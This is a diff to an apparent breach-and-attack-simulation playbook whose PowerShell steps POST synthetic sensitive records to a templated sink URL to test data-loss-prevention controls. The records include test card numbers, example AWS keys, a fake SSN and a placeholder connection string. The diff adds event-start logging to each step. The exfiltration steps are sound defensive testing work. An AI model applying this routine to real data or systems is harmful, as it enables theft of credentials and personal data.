@@ -57,6 +57,7 @@ steps:
       $ErrorActionPreference = 'SilentlyContinue'
       $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$csvContent; channel='https-post'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
         Write-Output "EXEC T1567: multi-type sensitive record POSTed over HTTPS. [BAS-SIM-DLP-SINK-HTTPS]"
       } catch {
@@ -89,6 +90,7 @@ steps:
       $ErrorActionPreference = 'SilentlyContinue'
       $payload = "[default]`naws_access_key_id=AKIAIOSFODNN7EXAMPLE`naws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$payload; channel='https-post'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
         Write-Output "EXEC T1567: AWS-credential-shaped record POSTed over HTTPS. [BAS-SIM-DLP-SINK-HTTPS]"
       } catch {
@@ -121,6 +123,7 @@ steps:
       $ErrorActionPreference = 'SilentlyContinue'
       $payload = "Data Source=BAS-SIM-ORACLE;User Id=bas_sim_user;Password=BAS-SIM-DLP-Placeholder1;"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$payload; channel='https-post'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
         Write-Output "EXEC T1567: Oracle-connection-string-shaped record POSTed over HTTPS. [BAS-SIM-DLP-SINK-HTTPS]"
       } catch {
@@ -153,6 +156,7 @@ steps:
       $ErrorActionPreference = 'SilentlyContinue'
       $payload = "# [BAS-SIM-DLP]`nAWS_SECRET = `"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`"  # test fixture"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$payload; channel='https-post'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
         Write-Output "EXEC T1567: Python-source-code-shaped record POSTed over HTTPS. [BAS-SIM-DLP-SINK-HTTPS]"
       } catch {
@@ -185,6 +189,7 @@ steps:
       $ErrorActionPreference = 'SilentlyContinue'
       $payload = "[BAS-SIM-DLP] Name,SSN`nJohn BasSim,000-12-3456"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$payload; channel='https-post'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
         Write-Output "EXEC T1567: US-SSN-shaped record POSTed over HTTPS. [BAS-SIM-DLP-SINK-HTTPS]"
       } catch {
@@ -217,6 +222,7 @@ steps:
       $ErrorActionPreference = 'SilentlyContinue'
       $payload = "[BAS-SIM-DLP] CardBrand,CardNumber`nVisa,4111111111111111"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$payload; channel='https-post'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
         Write-Output "EXEC T1567: Visa-card-shaped record POSTed over HTTPS. [BAS-SIM-DLP-SINK-HTTPS]"
       } catch {
